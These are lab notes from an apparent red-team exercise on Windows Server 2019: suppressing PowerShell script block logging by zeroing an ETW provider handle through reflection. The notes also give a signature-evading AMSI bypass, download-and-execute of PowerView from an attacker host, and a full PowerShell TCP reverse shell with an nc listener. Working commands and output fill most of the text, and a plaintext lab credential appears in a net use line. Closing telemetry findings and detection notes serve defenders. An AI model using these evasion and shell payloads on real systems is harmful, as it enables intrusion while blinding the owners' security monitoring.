# Blinding the Microsoft-Windows-PowerShell ETW Provider
### Managed Reflection Handle Zeroing + AMSI Bypass — Lab Notes
**Platform:** Windows Server 2019 (Build 17763.8644)  
**Date:** 2026-05-28  
**Context:** Local assumed-breach, Administrator session  

---

## Concept

The Microsoft-Windows-PowerShell ETW provider (`{A0C1853B-5C40-4B15-8766-3CF1C58F985A}`) is the source of EID 4104 — script block logging. Every PowerShell command run in a session emits through this provider to two consumers: `EventLog-Application` (the Windows event log, where 4104 lands) and `DefenderApiLogger` (MDE telemetry pipeline).

The goal was to interfere with both consumers simultaneously without killing the provider, patching ntdll, or making any native calls — the equivalent of looping a CCTV feed to a still frame. Camera on, recording light on, feed shows last known good state.

The mechanism: the provider's kernel registration handle lives as a private field (`m_regHandle`) on a `System.Diagnostics.Eventing.EventProvider` object stored as a static field on `PSEtwLogProvider` inside the loaded SMA assembly. Zero the handle via managed reflection. In lab testing, `EtwEventWrite` calls against handle=0 produced no emitted events and no exceptions. The provider continued to report itself active (`m_enabled=1`). No self-healing or re-registration was observed.

---

## Environment

- **OS:** Windows Server 2019 Evaluation, Build 17763.8644  
- **Attacker:** Kali 192.168.1.218  
- **Target:** 192.168.1.251 (local session — Administrator PS window)  
- **Sysmon:** Running (`EventLog-Microsoft-Windows-Sysmon-Operational`, `SYSMON TRACE`, `SysmonDnsEtwSession`)  
- **Defender:** Real-time protection enabled  
- **ETW consumers on PS provider:** `DefenderApiLogger`, `EventLog-Application`  

---

## Phase 1 — Recon

Confirm the provider is registered and identify active consumers:

```powershell
logman query providers | findstr -i powershell
Get-EtwTraceProvider | Where-Object {$_.Guid -eq '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'}
logman query -ets
```

**Result:**  
- Provider confirmed registered  
- Two consumers: `DefenderApiLogger` (autologger) and `EventLog-Application`  
- Sysmon sessions confirmed running — independent ETW channel, separate attack surface  

Enumerate ETW-related types in the loaded SMA assembly:

```powershell
[System.AppDomain]::CurrentDomain.GetAssemblies() |
  Where-Object { $_.FullName -like '*System.Management.Automation*' } |
  ForEach-Object { $_.GetTypes() } |
  Where-Object { $_.Name -like '*Etw*' -or $_.Name -like '*PSEtw*' } |
  Select-Object FullName
```

**Result:** `System.Management.Automation.Tracing.PSEtwLogProvider` confirmed present in memory.

**Pain point:** Direct PS type accelerator syntax `[System.Management.Automation.Tracing.PSEtwLogProvider]` fails on Server 2019 — the type is not in the default resolution path. Required loading via assembly reference:

```powershell
$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.FullName -like '*System.Management.Automation*' }
$type = $assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

---

## Phase 2 — Mapping the Provider Object

Enumerate static fields on `PSEtwLogProvider`:

```powershell
$type.GetFields([System.Reflection.BindingFlags]'NonPublic,Static') | Select-Object Name, FieldType
```

**Result:**

| Field | Type |
|---|---|
| `etwProvider` | `System.Diagnostics.Eventing.EventProvider` |
| `PowerShellEventProviderGuid` | `System.String` |
| `_xferEventDescriptor` | `System.Diagnostics.Eventing.EventDescriptor` |

Drill into the provider object's instance fields:

```powershell
$field = $type.GetField('etwProvider', [System.Reflection.BindingFlags]'NonPublic,Static')
$providerObject = $field.GetValue($null)
$providerObject.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic,Instance') | Select-Object Name, FieldType
```

**Result:**

| Field | Type | Purpose |
|---|---|---|
| `m_regHandle` | `System.Int64` | Kernel registration handle |
| `m_enabled` | `System.Int32` | Provider enabled state |
| `m_level` | `System.Byte` | Event level filter |
| `m_anyKeywordMask` | `System.Int64` | Keyword filter |
| `m_etwCallback` | `EtwEnableCallback` | Session enable/disable callback |
| `m_providerId` | `System.Guid` | Provider GUID |
| `m_disposed` | `System.Int32` | Disposal state |

Read baseline values:

```powershell
$iflags = [System.Reflection.BindingFlags]'NonPublic,Instance'
$regHandle = $providerObject.GetType().GetField('m_regHandle', $iflags).GetValue($providerObject)
$enabled   = $providerObject.GetType().GetField('m_enabled',   $iflags).GetValue($providerObject)
$guid      = $providerObject.GetType().GetField('m_providerId', $iflags).GetValue($providerObject)
```

**Baseline:**
```
regHandle : 32934157215428960
enabled   : 1
providerId: a0c1853b-5c40-4b15-8766-3cf1c58f985a
```

Active kernel handle, provider live, GUID correct.

---

## Phase 3 — ETW Provider Interference

Confirm 4104 baseline — script block logging active without GPO registry key (Server 2019 eval default):

```powershell
Invoke-Expression "Write-Host 'ETW_BASELINE_TEST_001'"
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Result:** 4104 landed. Baseline confirmed.

Zero the handle:

```powershell
$handleField = $providerObject.GetType().GetField('m_regHandle', $iflags)
$handleField.SetValue($providerObject, [Int64]0)
Write-Host "regHandle after: $($handleField.GetValue($providerObject))"
```

```
regHandle after: 0
```

Run a post-intervention test:

```powershell
Invoke-Expression "Write-Host 'ETW_BLIND_TEST_001'"
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Observed result:** Event log remained at pre-intervention timestamps. `ETW_BLIND_TEST_001` executed and printed to console. No new 4104 was generated. No exceptions were thrown.

Post-intervention field state:

```
regHandle : 0
enabled   : 1
providerId: a0c1853b-5c40-4b15-8766-3cf1c58f985a
```

`m_enabled=1` — the provider reported itself active. No self-healing or re-registration observed for the duration of the session.

**Sysmon check:** No EID 10, no EID 8, no events correlating to the reflection activity were observed in Sysmon output. The operation produced no Sysmon telemetry in this lab configuration. This is consistent with managed reflection making no `OpenProcess` or similar kernel-visible calls that Sysmon hooks against.

---

## Phase 4 — AMSI Bypass

With provider interference established, next step was loading PowerView from a Kali HTTP share. Three blockers hit in sequence.

**Blocker 1 — Guest SMB blocked by policy**

Initial attempt via SMB:
```powershell
IEX (New-Object Net.WebClient).DownloadString('\\192.168.1.218\share\PowerView.ps1')
```
```
You can't access this shared folder because your organization's security policies block unauthenticated guest access.
```

Fix: restart smbserver with credentials, authenticate via `net use`.

**Blocker 2 — Defender quarantined PowerView off the Kali box**

Once authenticated, Defender scanned the file during the download attempt, flagged `HackTool:PowerShell/PowerView`, and deleted the source file from the Kali share via the open SMB handle. The file on Kali was gone.

Worth noting: Defender followed the file handle across an authenticated SMB session back to a Linux host and deleted the source file. Delivery method matters — SMB gives Defender handle-level access to the source.

Fix: restore PowerView, switch to HTTP:
```bash
# [Kali]
python3 -m http.server 8080
```

**Blocker 3 — AMSI blocked the IEX load**

```
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

AMSI scanned the download buffer before IEX could execute. The ETW provider interference is irrelevant here — AMSI operates as a separate pre-execution interception pipeline.

**AMSI bypass — signature evasion via fragmented type resolution**

Standard `amsiInitFailed` field-set approach is fully signatured. Three variants blocked in sequence:

```powershell
# Blocked — literal string
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Blocked — string concat on field name only
$a = 'amsi'; $b = 'InitFailed'
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($a+$b,'NonPublic,Static').SetValue($null,$true)

# Blocked — base64 field name, full type string still present
$field = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($field,'NonPublic,Static').SetValue($null,$true)
```

The signature fires on the combined pattern — `AmsiUtils` + `GetField` + `SetValue` in contiguous context. Fragmenting the type string broke it:

```powershell
$c = 'System.Management.Automation.'
$d = 'Amsi'
$e = 'Utils'
$f = [Ref].Assembly.GetType($c+$d+$e)
$g = $f.GetField($a+$b, 'NonPublic,Static')
$g.SetValue($null, $true)
```

**Observed result:** No block. `$g.GetValue($null)` returned `True`. No further AMSI interception observed in session.

---

## Phase 5 — PowerView Execution Under Provider Interference

Load PowerView via HTTP:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.218:8080/PowerView.ps1')
```

No error. No Defender alert observed. No 4104 generated.

Run enumeration:

```powershell
Get-DomainUser -Identity Administrator
```

Full AD object returned — logon count, certificates, group memberships, SID, UAC flags, Distinguished Name.

Check 4104 log:

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Observed result:**

```
5/28/2026 1:59:31 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:42 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:06 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:06 AM  Creating Scriptblock text (1 of 1):...
```

The `01:59:31` entry is the `Get-WinEvent` query itself. The IEX load and `Get-DomainUser` call generated no 4104 entries. The event log was querying its own suppressed telemetry path.

---

## Phase 6 — Reverse Shell Under Provider Interference

With ETW provider interference and AMSI bypass both active in PID 1192, a plain TCP PS reverse shell was executed from the same session:

```powershell
# [WIN] — run from interfered PS session
$client = New-Object Net.Sockets.TCPClient('192.168.1.218',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

```bash
# [Kali]
nc -lvnp 4444
```

Shell landed. Token confirmed via `whoami /all`:

```
lab2019\administrator
Domain Admins, Enterprise Admins, Schema Admins
SeDebugPrivilege: Enabled
SeImpersonatePrivilege: Enabled
High Mandatory Level
```

No Defender alert observed. No 4104 generated. The only noise during the session was a sample submission popup in a separate unblinded PS window — not the operational window, not blocking.

---

## Phase 7 — ELK Telemetry Validation

ELK (Winlogbeat 8.19.14 → Elasticsearch/Kibana) confirmed the full behavioral skeleton visible to a defender, with zero script block content observed.

**What Sysmon captured — PID 1192 (the interfered process):**

| Time (UTC) | EID | Detail |
|---|---|---|
| 09:05:59 | 3 | `powershell.exe` → `192.168.1.218:445` (SMB — initial delivery attempt, blocked by policy) |
| 09:15:24 | 3 | `powershell.exe` → `192.168.1.218:8080` (HTTP — PowerView download) |
| 09:15:45 | 3 | `powershell.exe` → `192.168.1.251:389` (LDAP — `Get-DomainUser` DC query) |
| 09:33:09 | 3 | `powershell.exe` → `192.168.1.218:4444` (TCP — reverse shell) |
| 09:15:45 | 22 | DNS: `_ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL` (PowerView DC discovery) |
| 09:33:20 | 1 | `whoami.exe` spawned by `powershell.exe` PID 1192 |
| 09:33:26 | 1 | `whoami.exe /all` spawned by `powershell.exe` PID 1192 |
| 09:12:25 | 1 | `net.exe use \\192.168.1.218\share /user:osher Password123` |

**What was absent:**

No EID 4104 entries were observed for PID 1192 after provider interference was applied. The IEX load of PowerView, `Get-DomainUser`, the AMSI bypass chain, and the reverse shell payload all executed without generating script block log entries in this lab configuration.

**Credential exposure finding:**

The `net use` command with plaintext credentials appeared twice in EID 1 CommandLine fields — at `09:07:54` and `09:12:25`. Sysmon process create logging captures command line arguments verbatim. In environments with Sysmon process creation and command-line capture enabled, credentials passed via `net use` appear verbatim in EID 1 `CommandLine` fields. This telemetry surface is unaffected by ETW provider interference or AMSI bypass because both operate above process creation telemetry.

**The detection picture an analyst faces:**

A single PS process (`LAB2019\Administrator`, High integrity, Explorer-spawned, PID 1192) made four outbound connections (SMB, HTTP, LDAP, TCP/4444), spawned `whoami`, and opened a subsequent PS window. The behavioral chain is visible; script content is not.

Sysmon gave the analyst the pipe. ETW provider interference removed the water.

---

## Findings Summary

| Telemetry Surface | Observed Status |
|---|---|
| EID 4104 (script block logging) | No events observed after provider interference — PowerView load, enumeration, reverse shell all unlogged |
| DefenderApiLogger | Shares the same provider registration path; no downstream validation performed in this lab |
| Sysmon (interference operation itself) | No events observed — managed reflection produced no Sysmon-visible kernel calls in this configuration |
| Defender real-time (PowerView sig) | No alert observed via HTTP delivery post-AMSI bypass |
| Defender real-time (reverse shell) | No alert observed — payload executed inside interfered session |
| AMSI | Bypassed via fragmented type resolution in lab testing |
| Sysmon EID 3 (network connections) | Fully captured — SMB, HTTP, LDAP, TCP/4444 all logged |
| Sysmon EID 1 (process create) | Fully captured — `whoami`, `net use` with plaintext credentials logged |
| Sysmon EID 22 (DNS) | Fully captured — PowerView DC discovery queries logged |
| `net use` credentials | Appeared in plaintext in EID 1 CommandLine — unaffected by any PS-layer evasion |

---

## Boundaries

This technique affects the **current PS runspace only**. Each PS process has its own `etwProvider` instance. Native binaries (Rubeus, curio.exe) are unaffected — they run in separate processes with their own ETW registrations and their own kernel handles. Kernel-level telemetry (EID 4663 on LSASS, Microsoft-Windows-Threat-Intelligence callbacks, Security Auditing) is out of reach from any userland managed-layer technique.

The interference covers **what ran** — command content, script logic, tradecraft strings captured via script block logging. It does not cover **what that tradecraft did** — LDAP queries, DNS lookups, network connections, and child process creates remain visible to Sysmon and network-level detection.

Useful coverage surface: PS-based enumeration, PS-based lateral movement setup, any tooling running inside the interfered runspace. Not a substitute for operational security at the network or process layer.

---

## Detection Notes

Operationalizing detection against this technique is non-trivial:

- **Negative signal on 4104** — a PS process with meaningful lifetime, network activity, and child processes but no corresponding script block events is anomalous. Requires baselining PS session telemetry against process lifetime, which is not standard in most SIEM deployments. This signal outlives the specific technique — any method of suppressing 4104 produces the same gap.
- **Reflection on SMA assembly** — the `GetAssemblies()` + `GetType()` + `GetField()` + `SetValue()` chain against the SMA assembly produces no native calls and no Sysmon EID 10 in this configuration. Detection would require a custom ETW consumer or AMSI provider monitoring managed reflection patterns at the session level.
- **`m_regHandle` integrity monitoring** — nothing in the default Windows telemetry stack observed in this lab monitors provider handle state. A custom PS engine extension or constrained language mode policy could in principle check this.
- **AMSI bypass pattern** — fragmented type resolution across multiple variable assignments evaded static signatures in lab testing. Behavioral detection would need to correlate `GetType` + `GetField` + `SetValue` calls across a session boundary rather than evaluating each line independently.
- **`net use` credential exposure** — credentials passed via `net use` appear verbatim in Sysmon EID 1 CommandLine regardless of ETW or AMSI state. No PS-layer evasion technique affects process create telemetry. This is a hard boundary worth operationalizing as a detection rule if not already present.

The strongest available primitive remains the 4104 gap: a PS session with process lifetime but absent script block telemetry is an anomaly worth investigating. Difficult to operationalize reliably, but it survives technique evolution.

---

*Lab: Windows Server 2019 / Kali / Sysmon + Winlogbeat + ELK*  
*Series: ETW Blinding — Vector research extension*
